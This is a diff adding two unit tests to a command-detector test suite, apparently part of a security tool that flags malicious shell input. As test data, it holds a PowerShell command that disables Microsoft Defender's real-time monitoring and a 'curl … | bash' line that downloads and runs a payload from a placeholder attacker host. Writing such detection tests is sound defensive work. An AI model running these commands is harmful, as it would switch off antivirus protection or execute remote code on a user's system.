@@ -26,5 +26,20 @@ describe("Command Detector", () => {
     expect(signals.length).toBeGreaterThan(0);
     expect(signals[0].reason).toContain("living-off-the-land");
   });
+
+  it("detects defense evasion attempting to disable Microsoft Defender", () => {
+    const text = "powershell -c Set-MpPreference -DisableRealtimeMonitoring $true";
+    const signals = detectExecutionCommands(text);
+
+    expect(signals.some((s) => s.reason.includes("disable antivirus"))).toBe(true);
+  });
+
+  it("detects Mac / Linux ClickFix remote shell pipelines", () => {
+    const text = 'curl -fsSL https://evil.sh/payload | bash';
+    const signals = detectExecutionCommands(text);
+
+    expect(signals.length).toBeGreaterThan(0);
+    expect(signals[0].snippet).toContain("Remote execution pipeline");
+  });
 });
 
